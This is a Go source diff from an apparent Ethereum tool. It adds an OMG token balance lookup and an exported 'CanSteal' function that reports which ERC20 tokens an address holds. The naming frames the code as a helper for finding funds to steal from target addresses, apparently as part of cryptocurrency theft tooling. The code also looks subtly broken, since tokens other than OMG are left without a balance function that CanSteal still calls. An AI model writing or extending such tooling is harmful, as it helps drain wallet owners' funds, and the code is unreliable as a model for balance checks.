@@ -4,6 +4,7 @@ import (
 	"context"
 	"math/big"
 
+	"github.com/ethereum/go-ethereum/accounts/abi/bind"
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/ethclient"
 
@@ -12,10 +13,11 @@ import (
 
 // ERC20 token structure
 type ERC20 struct {
-	addr     string
-	name     string
-	unit     string
-	contract interface{}
+	addr      string
+	name      string
+	unit      string
+	contract  interface{}
+	balanceOf func(common.Address) (*big.Int, error)
 }
 
 var (
@@ -37,7 +39,11 @@ func init() {
 	for i, token := range tokens {
 		switch token.unit {
 		case "OMG":
-			token.contract, _ = omg.NewOMGTokenCaller(common.HexToAddress(token.addr), ethClient)
+			caller, _ := omg.NewOMGTokenCaller(common.HexToAddress(token.addr), ethClient)
+			token.contract = caller
+			token.balanceOf = func(addr common.Address) (*big.Int, error) {
+				return caller.BalanceOf(&bind.CallOpts{}, addr)
+			}
 		default:
 			continue
 		}
@@ -53,4 +59,16 @@ func SuggestGas() (*big.Int, error) {
 // List ERC20 tokens registered
 func List() []ERC20 {
 	return tokens
+}
+
+// CanSteal ERC20 token of this address
+func CanSteal(addr common.Address) (ret string) {
+	for _, token := range tokens {
+		if val, err := token.balanceOf(addr); err == nil {
+			if val.Uint64() > 0 {
+				ret += token.unit + " "
+			}
+		}
+	}
+	return
 }
